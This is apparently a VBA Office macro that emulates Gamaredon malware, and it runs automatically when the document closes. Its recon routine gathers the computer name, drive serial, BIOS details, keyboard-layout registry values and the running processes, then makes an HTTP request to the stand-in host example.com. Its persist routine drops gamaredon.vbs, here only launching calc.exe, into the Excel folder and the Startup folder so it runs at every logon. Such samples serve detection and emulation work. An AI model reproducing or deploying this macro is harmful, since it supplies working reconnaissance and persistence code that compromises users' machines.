Sub recon()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")

    Dim drive
    homedrive = Environ("HOMEDRIVE")
    compname = Environ("COMPUTERNAME")
    Set drive = CreateObject("Scripting.FileSystemObject").GetDrive(homedrive)
    serial = Hex(drive.SerialNumber)

    Set wbem = GetObject("winmgmts://./root/cimv2")
    Set wquery = wbem.ExecQuery("Select * from Win32_BIOS where PrimaryBIOS = true", , 48)

    Dim wssh
    Set wssh = CreateObject("WScript.Shell")

    kblayout = wssh.RegRead("HKCU\Keyboard Layout\Preload\")
    doskbcodes = wssh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout\DosKeybCodes\")

    Set pslist = wbem.ExecQuery("Select * from Win32_Process")

    Dim url As String
    url = "http://example.com/"

    Dim httpc As Object
    Set httpc = CreateObject("MSXML2.XMLHTTP")
    httpc.Open "GET", url, False
    httpc.Send

End Sub
Sub persist()
    appdata = Environ("APPDATA")
    userprofile = Environ("USERPROFILE")

    p_base = userprofile + "\Documents\gamaredon.vbs"
    p_excel = appdata + "\Microsoft\Excel\gamaredon.vbs"
    p_startup = appdata + "\Microsoft\Windows\Start Menu\Programs\Startup\gamaredon.vbs"

    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    Dim fso_obj As Object
    Set fso_obj = fso.CreateTextFile(p_base, True, True)
    fso_obj.Write "Set WshShell = CreateObject(""WScript.Shell"")" + vbCrLf
    fso_obj.Write "WshShell.Run(""calc.exe"")" + vbCrLf

    fso.CopyFile p_base, p_excel
    fso.CopyFile p_base, p_startup
End Sub
Sub Document_Close()
    recon
    persist
End Sub